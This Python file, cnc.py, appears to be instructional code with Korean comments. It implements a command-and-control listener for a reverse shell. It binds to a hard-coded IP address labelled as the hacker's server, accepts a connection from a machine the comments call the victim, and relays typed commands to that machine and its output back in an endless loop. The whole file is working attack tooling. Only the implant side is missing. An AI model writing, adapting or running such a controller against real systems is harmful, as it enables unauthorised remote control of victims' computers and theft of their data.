# cnc.py
import socket

addr = ('182.230.134.78', 12345)  #해커 서버 주소를 의미
with socket.socket() as s:
    s.bind(addr)
    s.listen()                        #listen을 실행하면 서버 포트가 열리고 연결을 대기하게됨
    print('cnc server is started...')

    conn, addr = s.accept()         # 접속자(희생자)의 주소, 연결 정보등을 담음
    print('Connect by', addr)

    while True:                     # 무한 loop를 돌면서 피해자와 통신함
        try:
            # 받은 데이터 출력
            data = conn.recv(1024)     # 피해자로부터 메세지를 받아 저장
            if data :
                print(data.decode(), end='') # 받은 데이터가 있다면 출력
            # 보낼 데이터 전송
            data = input()                   # 콘솔로 입력값을 받아 저장
            conn.send(data.encode())         # 다시 피해자한테 메세지 전송
        except Exception as e:
            print(e)

print("{} is disconnected".format(addr))
